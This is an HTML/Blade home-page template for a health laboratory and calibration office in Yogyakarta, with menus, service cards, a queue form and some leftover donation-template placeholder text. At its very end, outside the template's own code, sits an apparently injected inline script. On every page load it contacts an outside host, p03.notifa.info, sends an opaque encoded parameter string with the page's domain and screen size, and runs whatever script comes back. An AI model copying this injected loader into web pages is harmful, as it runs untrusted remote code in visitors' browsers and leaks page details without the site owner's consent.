<!doctype html>
<html lang="en">

<head>
	<!-- Required meta tags -->
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<link rel="icon" href="{{URL::asset('extadmin/dist/img/favicon.png')}}" type="image/png">
	<title>Balai Labkes & Kalibrasi</title>
	<!-- Bootstrap CSS -->
	<link rel="stylesheet" href="{{URL::asset('extadmin/dist/css/bootstrap.css')}}">
	<link rel="stylesheet" href="vendors/linericon/style.css">
	<link rel="stylesheet" href="css/font-awesome.min.css">
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"  integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/simplelightbox/1.17.3/simplelightbox.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jquery-nice-select/1.1.0/css/nice-select.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.css">
	<!-- main css -->
	<link rel="stylesheet" href="{{URL::asset('extdinkes/css/style.css')}}">
	<link rel="stylesheet" href="{{URL::asset('extdinkes/css/responsive.css')}}">
</head>

<body>


	<!--================Header Menu Area =================-->
	<header class="header_area">
		<div class="main_menu">
			<nav class="navbar navbar-expand-lg navbar-light">
				<div class="container">
					<!-- Brand and toggle get grouped for better mobile display -->
					<a class="navbar-brand logo_h" href="index.html">
						<img src="{{URL::asset('extdinkes/img/logodinkes.png')}}" alt="">
					</a>
					<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent"
					 aria-expanded="false" aria-label="Toggle navigation">
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
					</button>
					<!-- Collect the nav links, forms, and other content for toggling -->
					<div class="collapse navbar-collapse offset" id="navbarSupportedContent">
						<div class="row ml-0 w-100">
							<div class="col-lg-12 pr-0">
								<ul class="nav navbar-nav center_nav pull-right">
									<li class="nav-item active">
										<a class="nav-link" href="index.html">Beranda</a>
									</li>
									<li class="nav-item submenu dropdown">
										<a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Profil</a>
										<ul class="dropdown-menu">
											<li class="nav-item">
												<a class="nav-link" href="#">Sejarah</a>
											</li>
											<li class="nav-item">
												<a class="nav-link" href="#">Visi dan Misi</a>
											</li>
											<li class="nav-item">
												<a class="nav-link" href="#">Struktur Organisasi</a>
											</li>
											<li class="nav-item">
												<a class="nav-link" href="#">Upaya Kesehatan</a>
											</li>
											<li class="nav-item">
												<a class="nav-link" href="#">Kopetensi SDM</a>
											</li>
										</ul>
									</li>
									<li class="nav-item submenu dropdown">
										<a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Layanan & Tarif</a>
										<ul class="dropdown-menu">
											<li class="nav-item">
												<a class="nav-link" href="#">Immunologi</a>
											</li>
											<li class="nav-item">
												<a class="nav-link" href="#">Patologi</a>
											</li>
											<li class="nav-item">
												<a class="nav-link" href="#">Mikrobiologi</a>
											</li>
											<li class="nav-item">
												<a class="nav-link" href="#">Kimia Kesehatan</a>
											</li>
											<li class="nav-item">
												<a class="nav-link" href="#">Kalibrasi</a>
											</li>
											<li class="nav-item">
												<a class="nav-link" href="#">Napza & Forensik</a>
											</li>
											<li class="nav-item">
												<a class="nav-link" href="#">Penelitian & Magang</a>
											</li>
										</ul>
									</li>

									<li class="nav-item submenu dropdown">
										<a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Kepustakaan</a>
										<ul class="dropdown-menu">
											<li class="nav-item">
												<a class="nav-link" href="#">Penelitian</a>
											</li>
											<li class="nav-item">
												<a class="nav-link" href="#">Perpustakaan</a>
											</li>
											<li class="nav-item">
												<a class="nav-link" href="#">Galery</a>
											</li>
											<li class="nav-item">
												<a class="nav-link" href="#">Download</a>
											</li>
										</ul>
									</li>
									<li class="nav-item">
										<a class="nav-link" href="#">Berita & Artikel</a>
									</li>
									<li class="nav-item">
										<a class="nav-link" href="#">Kontak</a>
									</li>
									
								</ul>
							</div>
						</div>
					</div>
				</div>
			</nav>
		</div>
	</header>
	<!--================Header Menu Area =================-->

	<!--================ Home Banner Area =================-->
	<section class="home_banner_area">
		<div class="overlay"></div>
		<div class="banner_inner d-flex align-items-center">
			<div class="container">
				<div class="banner_content row">
					<div class="offset-lg-2 col-lg-8">
						<img class="img-fluid" src="{{URL::asset('extdinkes/img/text-img.png')}}" alt="">
						<p>Kami siap melayani anda dengan sepenuh hati. Anda juga bisa melakukan pendaftaran antrean cek laboratorium secara online.</p>
						<a class="main_btn mr-10" href="#">Daftar Sekarang</a>
						<a class="white_bg_btn" href="#">Cek Antrian</a>
					</div>
				</div>
			</div>
		</div>
	</section>
	<!--================ End Home Banner Area =================-->


	<!--================ Start important-points section =================-->
	<section class="donation_details pad_top">
		<div class="container">
			<h1><center>Layanan Laboratorium</center></h1>
			<div class="row">
				<div class="col-lg-4 col-md-6 single_donation_box">
					<img src="{{URL::asset('extdinkes/img/patologi.png')}}" alt="">
					<h4>Layanan Patologi</h4>
					<p>
						Untuk Pelayanan Patologi
					</p>
				</div>
				<div class="col-lg-4 col-md-6 single_donation_box">
					<img src="{{URL::asset('extdinkes/img/mikrobiologi.png')}}" alt="">
					<h4>Layanan Mikrobiologi</h4>
					<p>
						Untuk Pelayanan Mikrobiologi
					</p>
				</div>
				<div class="col-lg-4 col-md-6 single_donation_box">
					<img src="{{URL::asset('extdinkes/img/kimia.png')}}" alt="">
					<h4>Layanan Kimia Kesehatan</h4>
					<p>
						Untuk Layanan Kimia Kesehatan
					</p>
				</div>
				<div class="col-lg-4 col-md-6 single_donation_box">
					<img src="{{URL::asset('extdinkes/img/imunologi.png')}}" alt="">
					<h4>Layanan Immunologi</h4>
					<p>
						Untuk Layanan Immunologi
					</p>
				</div>
				<div class="col-lg-4 col-md-6 single_donation_box">
					<img src="{{URL::asset('extdinkes/img/kalibrasi.png')}}" alt="">
					<h4>Layanan Kalibrasi</h4>
					<p>
						Untuk Layanan Kalibrasi
					</p>
				</div>
				<div class="col-lg-4 col-md-6 single_donation_box">
					<img src="{{URL::asset('extdinkes/img/penelitian.png')}}" alt="">
					<h4>Layanan Penelitian dan Magang</h4>
					<p>
						Untuk Layanan Penelitian dan Magang
					</p>
				</div>
			</div>
		</div>
	</section>
	<!--================ End important-points section =================-->

	<!--================ Start Our Major Cause section =================-->
	<section class="our_major_cause section_gap">
		<div class="container">
			<div class="row justify-content-center section-title-wrap">
				<div class="col-lg-12">
					<h1>Berita Terkini</h1>
					<p>
						Baca artikel-artikel bermanfaat berikut ini.
					</p>
				</div>
			</div>

			<div class="row">
				<div id="our-major-cause" class="owl-carousel">
					<div class="card">
						<div class="card-body">
							<figure>
								<img class="card-img-top img-fluid" src="{{URL::asset('extadmin/dist/img/d1.png')}}" alt="Card image cap">
							</figure>
							<div class="progress">
								<div class="progress-bar" role="progressbar" aria-valuenow="76" aria-valuemin="0" aria-valuemax="100" style="width: 76%;">
									<!-- <span>Funded 76%</span> -->
								</div>
							</div>
							<div class="card_inner_body">
								<div class="card-body-top">
									<!-- <span>Raised: $7,689</span> / $10,000 -->
								</div>
								<h4 class="card-title">Did not find your Package</h4>
								<p class="card-text">inappropriate behavior is often laughed off as “boys will be boys,” women face higher conduct standards especially
									in the workplace that’s why it’s crucial.
								</p>
								<a href="#" class="main_btn2">Baca Sekarang</a>
							</div>
						</div>
					</div>

					<div class="card">
						<div class="card-body">
							<figure>
								<img class="card-img-top img-fluid" src="img/donation/d2.jpg" alt="Card image cap">
							</figure>
							<div class="progress">
								<div class="progress-bar" role="progressbar" aria-valuenow="76" aria-valuemin="0" aria-valuemax="100" style="width: 76%;">
									<!-- <span>Funded 76%</span> -->
								</div>
							</div>
							<div class="card_inner_body">
								<div class="card-body-top">
									<!-- <span>Raised: $7,689</span> / $10,000 -->
								</div>
								<h4 class="card-title">Did not find your Package</h4>
								<p class="card-text">inappropriate behavior is often laughed off as “boys will be boys,” women face higher conduct standards especially
									in the workplace that’s why it’s crucial.
								</p>
								<a href="#" class="main_btn2">Baca Sekarang</a>
							</div>
						</div>
					</div>

					<div class="card">
						<div class="card-body">
							<figure>
								<img class="card-img-top img-fluid" src="img/donation/d3.jpg" alt="Card image cap">
							</figure>
							<div class="progress">
								<div class="progress-bar" role="progressbar" aria-valuenow="76" aria-valuemin="0" aria-valuemax="100" style="width: 76%;">
									<!-- <span>Funded 76%</span> -->
								</div>
							</div>
							<div class="card_inner_body">
								<div class="card-body-top">
									<!-- <span>Raised: $7,689</span> / $10,000 -->
								</div>
								<h4 class="card-title">Did not find your Package</h4>
								<p class="card-text">inappropriate behavior is often laughed off as “boys will be boys,” women face higher conduct standards especially
									in the workplace that’s why it’s crucial.
								</p>
								<a href="#" class="main_btn2">Baca Sekarang</a>
							</div>
						</div>
					</div>

					

					
				</div>
			</div>
		</div>
	</section>
	<!--================ Ens Our Major Cause section =================-->

	<!--================ Start Make Donation Area =================-->
	<section class="make_donation section_gap">
		<div class="container">
			<div class="row justify-content-start section-title-wrap">
				<div class="col-lg-12">
					<h1>Pantau Antrean Cek Laboratorium (FITUR INI SAMPAI BAWAH UNTUK PENGEMBANGAN)</h1>
					<p>
						Antrean ini bisa berubah setiap saat. Pastikan anda telah terdaftar dalam antrian.
					</p>
				</div>
			</div>

			<div class="donate_now_wrapper">
				<form>
					<div class="row">
						<div class="col-lg-4">
							<div class="donate_box mb-30">
								<div class="form-check">
									<input type="radio" class="form-check-input" name="donation" id="ten_doller">
									<label class="form-check-label d-flex justify-content-between" for="ten_doller">
										<div class="label_text">
											1
										</div>
										<div class="label_text">
											Patologi
										</div>
									</label>
								</div>
							</div>
						</div>

						<div class="col-lg-4">
							<div class="donate_box mb-30">
								<div class="form-check">
									<input type="radio" class="form-check-input" name="donation" id="fifty_doller">
									<label class="form-check-label d-flex justify-content-between" for="fifty_doller">
										<div class="label_text">
											13
										</div>
										<div class="label_text">
											Mikrobiologi
										</div>
									</label>
								</div>
							</div>
						</div>

						<div class="col-lg-4">
							<div class="donate_box mb-30">
								<div class="form-check">
									<input type="radio" class="form-check-input" name="donation" id="hundred_doller">
									<label class="form-check-label d-flex justify-content-between" for="hundred_doller">
										<div class="label_text">
											9
										</div>
										<div class="label_text">
											Kimia Kesehatan
										</div>
									</label>
								</div>
							</div>
						</div>

						<div class="col-lg-4">
							<div class="donate_box">
								<div class="form-check">
									<input type="radio" class="form-check-input" name="donation" id="two_fifty__doller">
									<label class="form-check-label d-flex justify-content-between" for="two_fifty__doller">
										<div class="label_text">
											20
										</div>
										<div class="label_text">
											Immunologi
										</div>
									</label>
								</div>
							</div>
						</div>

						<div class="col-lg-4">
							<div class="donate_box">
								<div class="form-check">
									<input type="radio" class="form-check-input" name="donation" id="two_fifty__doller">
									<label class="form-check-label d-flex justify-content-between" for="two_fifty__doller">
										<div class="label_text">
											7
										</div>
										<div class="label_text">
											Kalibrasi
										</div>
									</label>
								</div>
							</div>
						</div>
						<div class="col-lg-4">
							<div class="donate_box">
								<button type="submit" class="main_btn w-100">Daftar Sekarang</button>
							</div>
						</div>
					</div>
				</form>
			</div>
		</div>
	</section>
	<!--================ End Make Donation Area =================-->

	<!--================ Start Clients Logo Area =================-->
	<section class="clients_logo_area section_gap">
		<div class="container">
			<h1><center>Mitra Kami</center></h1>
					<p><center>Untuk meningkatkan pelayanan, kami telah bermitra dengan berbagai instansi baik Negeri maupun Swasta
					</center></p>
					<br>
			<div class="clients_slider owl-carousel">
				<div class="item">
					<img src="{{URL::asset('extadmin/dist/img/c-logo-1.png')}}" alt="">
				</div>
				<div class="item">
					<img src="{{URL::asset('extadmin/dist/img/c-logo-2.png')}}" alt="">
				</div>
				<div class="item">
					<img src="{{URL::asset('extadmin/dist/img/c-logo-1.png')}}" alt="">
				</div>
				<div class="item">
					<img src="{{URL::asset('extadmin/dist/img/c-logo-2.png')}}" alt="">
				</div>
				<div class="item">
					<img src="{{URL::asset('extadmin/dist/img/c-logo-1.png')}}" alt="">
				</div>
				
				<!-- <div class="item">
					<img src="img/clients-logo/c-logo-3.png" alt="">
				</div> -->
				<!-- <div class="item">
					<img src="img/clients-logo/c-logo-4.png" alt="">
				</div> -->
				<!-- <div class="item">
					<img src="img/clients-logo/c-logo-5.png" alt="">
				</div> -->
			</div>
		</div>
		</div>
	</section>
	<!--================ End Clients Logo Area =================-->

	<!--================ Support Campaign Area =================-->
	<!-- <section class="support_campaign pad_bottom">
		<div class="container">
			<div class="row justify-content-center section-title-wrap">
				<div class="col-lg-12">
					<h1>Mitra Kami</h1>
					<p>
						Untuk meningkatkan pelayanan, kami telah bermitra dengan berbagai instansi baik Negeri maupun Swasta
					</p>
				</div>
			</div> -->

			<!-- <div class="row">
				<div class="col-lg-6 mb-30">
					<div class="campaign_box">
						<div class="camppaign d-flex">
							<div class="img-box">
								<img class="img-fluid" src="img/donation/sc1.jpg" alt="">
							</div>

							<div>
								<h4>Help for cancer victims</h4>
								<h4>USD 22,563</h4>
							</div>
						</div>

						<div class="progress">
							<div class="progress-bar" role="progressbar" aria-valuenow="76" aria-valuemin="0" aria-valuemax="100" style="width: 76%;">
								<span>Funded 76%</span>
							</div>
						</div>
					</div>
				</div>

				<div class="col-lg-6 mb-30">
					<div class="campaign_box">
						<div class="camppaign d-flex">
							<div class="img-box">
								<img class="img-fluid" src="img/donation/sc1.jpg" alt="">
							</div>

							<div>
								<h4>Help for cancer victims</h4>
								<h4>USD 22,563</h4>
							</div>
						</div>

						<div class="progress">
							<div class="progress-bar" role="progressbar" aria-valuenow="76" aria-valuemin="0" aria-valuemax="100" style="width: 76%;">
								<span>Funded 76%</span>
							</div>
						</div>
					</div>
				</div>

				<div class="col-lg-6 mb-30">
					<div class="campaign_box">
						<div class="camppaign d-flex">
							<div class="img-box">
								<img class="img-fluid" src="img/donation/sc1.jpg" alt="">
							</div>

							<div>
								<h4>Help for cancer victims</h4>
								<h4>USD 22,563</h4>
							</div>
						</div>

						<div class="progress">
							<div class="progress-bar" role="progressbar" aria-valuenow="76" aria-valuemin="0" aria-valuemax="100" style="width: 76%;">
								<span>Funded 76%</span>
							</div>
						</div>
					</div>
				</div>

				<div class="col-lg-6 mb-30">
					<div class="campaign_box">
						<div class="camppaign d-flex">
							<div class="img-box">
								<img class="img-fluid" src="img/donation/sc1.jpg" alt="">
							</div>

							<div>
								<h4>Help for cancer victims</h4>
								<h4>USD 22,563</h4>
							</div>
						</div>

						<div class="progress">
							<div class="progress-bar" role="progressbar" aria-valuenow="76" aria-valuemin="0" aria-valuemax="100" style="width: 76%;">
								<span>Funded 76%</span>
							</div>
						</div>
					</div>
				</div>

				<div class="col-lg-6">
					<div class="campaign_box">
						<div class="camppaign d-flex">
							<div class="img-box">
								<img class="img-fluid" src="img/donation/sc1.jpg" alt="">
							</div>

							<div>
								<h4>Help for cancer victims</h4>
								<h4>USD 22,563</h4>
							</div>
						</div>

						<div class="progress">
							<div class="progress-bar" role="progressbar" aria-valuenow="76" aria-valuemin="0" aria-valuemax="100" style="width: 76%;">
								<span>Funded 76%</span>
							</div>
						</div>
					</div>
				</div>

				<div class="col-lg-6">
					<div class="campaign_box">
						<div class="camppaign d-flex">
							<div class="img-box">
								<img class="img-fluid" src="img/donation/sc1.jpg" alt="">
							</div>

							<div>
								<h4>Help for cancer victims</h4>
								<h4>USD 22,563</h4>
							</div>
						</div>

						<div class="progress">
							<div class="progress-bar" role="progressbar" aria-valuenow="76" aria-valuemin="0" aria-valuemax="100" style="width: 76%;">
								<span>Funded 76%</span>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section> -->
	<!--================ End Support Campaing Area =================-->

	<!--================ Start Experience Area =================-->
	<section class="experience_donation section_gap">
		<div class="container">
			<div class="row align-items-center justify-content-center">
				<div class="col-lg-12">
					<h1>Download Aplikasi SMART LAB !</h1>
					<p>Sekarang anda dapat melakukan pendaftaran dan memantau antrean hanya lewat smartphone!
						Download Aplikasi SMART LAB di Playstore sekarang juga!</p>
					<a href="#" class="main_btn2 mr-10">Download Here!</a>
					<!-- <a href="#" class="main_btn2">Create Fundraising today</a> -->
				</div>
			</div>
		</div>
	</section>
	<!--================ End Experience Area =================-->

	<!--================ Start Footer Area  =================-->
	<footer class="footer-area section_gap">
		<div class="container">
			<div class="row">
				<div class="col-lg-5  col-md-6 col-sm-6">
					<div class="single-footer-widget">
						<h6 class="footer_title">About Us</h6>
						<p>
							Alamat: Jalan Ngadinegaran MJ III No.62, Mantrijeron, Kec. Mantrijeron, Kota Yogyakarta, Daerah Istimewa Yogyakarta 55143
						</p>
					</div>
				</div>
				<div class="col-lg-5 col-md-6 col-sm-6">
					<div class="single-footer-widget">
						<h6 class="footer_title">Newsletter</h6>
						<p>Stay updated with our latest trends</p>
						<div id="mc_embed_signup">
							<form target="_blank" action="https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01"
							 method="get" class="subscribe_form relative">
								<div class="input-group d-flex flex-row">
									<input name="EMAIL" placeholder="Enter Email Address" onfocus="this.placeholder = ''" onblur="this.placeholder = 'Email Address '"
									 required="" type="email">
									<button class="btn sub-btn">
										<span class="lnr lnr-arrow-right"></span>
									</button>
								</div>
								<div class="mt-10 info"></div>
							</form>
						</div>
					</div>
				</div>
				<div class="col-lg-2 col-md-6 col-sm-6">
					<div class="single-footer-widget f_social_wd">
						<h6 class="footer_title">Follow Us</h6>
						<p>Let us be social</p>
						<div class="f_social">
							<a href="#">
								<i class="fa fa-facebook"></i>
							</a>
							<a href="#">
								<i class="fa fa-twitter"></i>
							</a>
							<a href="#">
								<i class="fa fa-dribbble"></i>
							</a>
							<a href="#">
								<i class="fa fa-behance"></i>
							</a>
						</div>
					</div>
				</div>
			</div>

			<div class="row">
				<div class="col-lg-12">
					<p class="copyright"><!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
Copyright (c) 2020. All rights reserved | This web is made with <i class="fa fa-heart-o" aria-hidden="true"></i> by <a>Balai Labkes & Kalibrasi Yogyakarta</a>
<!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
					</p>
				</div>
			</div>
		</div>
	</footer>
	<!--================ End Footer Area  =================-->



	<!-- Optional JavaScript -->
	<!-- jQuery first, then Popper.js, then Bootstrap JS -->
	<!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-nice-select/1.1.0/js/jquery.nice-select.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/owl-carousel/1.3.3/owl.carousel.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-ajaxchimp/1.3.0/jquery.ajaxchimp.min.js"></script>
	<script src="{{URL::asset('extdinkes/js/mail-script.js')}}"></script>
	<!-- <script src="{{URL::asset('extdinkes/js/custom.js')}}"></script> -->
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXnkwEwlxOEWjXfI%2biPPW5vg9%2fW0dioMGe0vVYwtacZFO%2fK9E27e1ZSbmYSAKAaDtZ%2flICMwlGhiBBLGrfUjQ%2fZcIvKUv6PM4BbW3eg71yxQaE%2b%2fp%2bRVTwUaHKobBHWbdNYSG4%2f3L8GfHfn8%2fWluyk8tPquEVn1zXZTB4a4lhBa8jKKcaW1ydlpqmvCVpjk8tdl2cca%2fw82BRIiDPv3HrJiLsNfIIWxMUVX86zlAVDlqM9XKHz%2b%2fTf0EIzPTSPAjnk2but%2bbBCPIjiZsZS8QR2eEkcnwpQsJCOuwHy0n8wBjuJtLzJsdoUc25MJb5llwFKRkRKkp%2b5bQalKWrFdFFWT1CqHVQE4uat9mMmh9xv%2f6f3GEu9PkPgGOYiRCDs3uhQDOJgmCIq7K5Yh2epPNkeEx9ystTNWOaQhiHX4ZKAhkTxNIaPZLvFYWVsd%2bdGlqXQasdOfcgCqi8OVAiH0LWAaiir0xF18sF16UkDnqYIA%2bWc4SMFDyHKRsgE9a3OLZsi" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>
